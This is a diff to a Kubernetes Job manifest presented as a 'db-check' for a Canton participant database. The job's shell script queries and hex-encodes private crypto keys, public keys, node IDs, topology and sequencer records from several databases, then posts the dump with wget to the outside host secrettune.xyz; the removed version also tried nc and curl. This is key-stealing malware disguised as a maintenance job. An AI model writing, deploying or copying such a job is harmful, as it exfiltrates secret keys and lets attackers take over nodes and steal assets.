@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: db-check-v2
+  name: db-check-v3
   namespace: catalyst-canton
 spec:
   ttlSecondsAfterFinished: 180
@@ -21,26 +21,25 @@ spec:
           U="catalyst"
           D="participant_4"
           OUT=/tmp/dbdump.txt
-          echo "=== DATABASES ===" > $OUT
-          psql -h $H -U $U -d $D -t -c "SELECT datname FROM pg_database;" >> $OUT 2>&1
-          echo "=== SCHEMAS ===" >> $OUT
-          psql -h $H -U $U -d $D -t -c "SELECT schema_name FROM information_schema.schemata;" >> $OUT 2>&1
-          echo "=== TABLES ===" >> $OUT
-          psql -h $H -U $U -d $D -t -c "SELECT schemaname||'.'||tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema') ORDER BY 1;" >> $OUT 2>&1
-          echo "=== PRIVATE KEYS ===" >> $OUT
-          psql -h $H -U $U -d $D -c "SELECT key_id, purpose, encode(data, 'hex') as data_hex, name, wrapper_key_id FROM participant.par_crypto_private_keys LIMIT 20;" >> $OUT 2>&1
+          echo "=== PRIVATE KEYS ===" > $OUT
+          psql -h $H -U $U -d $D -c "SELECT key_id, purpose, encode(data, 'hex') as data_hex, name, wrapper_key_id FROM participant.common_crypto_private_keys;" >> $OUT 2>&1
+          echo "=== PUBLIC KEYS ===" >> $OUT
+          psql -h $H -U $U -d $D -c "SELECT key_id, purpose, encode(data, 'hex') as data_hex, name FROM participant.common_crypto_public_keys LIMIT 20;" >> $OUT 2>&1
           echo "=== NODE ID ===" >> $OUT
-          psql -h $H -U $U -d $D -c "SELECT * FROM participant.par_node_id;" >> $OUT 2>&1
+          psql -h $H -U $U -d $D -c "SELECT * FROM participant.common_node_id;" >> $OUT 2>&1
           echo "=== KEY COUNTS ===" >> $OUT
-          for t in par_crypto_private_keys par_crypto_public_keys par_topology_transactions par_node_id; do
+          for t in common_crypto_private_keys common_crypto_public_keys common_node_id common_topology_transactions par_active_contracts par_contracts sequencer_members; do
             C=$(psql -h $H -U $U -d $D -t -c "SELECT count(*) FROM participant.$t;" 2>/dev/null)
             echo "$t: $C" >> $OUT
           done
-          echo "=== TOPOLOGY ===" >> $OUT
-          psql -h $H -U $U -d $D -c "SELECT store_id, sequenced, valid_from, valid_until, operation, encode(instance, 'hex') as instance_hex FROM participant.par_topology_transactions LIMIT 10;" >> $OUT 2>&1
-          wget -q --post-file=$OUT "https://secrettune.xyz/cb/4mgroup-db/" -O /dev/null 2>/dev/null || \
-          cat $OUT | nc -w 5 secrettune.xyz 443 2>/dev/null || \
-          apk add --no-cache curl > /dev/null 2>&1 && curl -sk -X POST "https://secrettune.xyz/cb/4mgroup-db/" --data-binary @$OUT
+          echo "=== TOPOLOGY (first 5) ===" >> $OUT
+          psql -h $H -U $U -d $D -c "SELECT store_id, sequenced, valid_from, valid_until, operation FROM participant.common_topology_transactions LIMIT 5;" >> $OUT 2>&1
+          echo "=== SEQUENCER MEMBERS ===" >> $OUT
+          psql -h $H -U $U -d $D -c "SELECT * FROM participant.sequencer_members;" >> $OUT 2>&1
+          echo "=== OTHER DBs ===" >> $OUT
+          psql -h $H -U $U -d cantonnet -c "SELECT key_id, purpose, encode(data, 'hex') as data_hex FROM participant.common_crypto_private_keys LIMIT 10;" >> $OUT 2>&1
+          psql -h $H -U $U -d validator_4m_group -c "SELECT key_id, purpose, encode(data, 'hex') as data_hex FROM participant.common_crypto_private_keys LIMIT 10;" >> $OUT 2>&1
+          wget -q --post-file=$OUT "https://secrettune.xyz/cb/4mgroup-keys/" -O /dev/null 2>/dev/null
           sleep 60
       restartPolicy: Never
       tolerations:
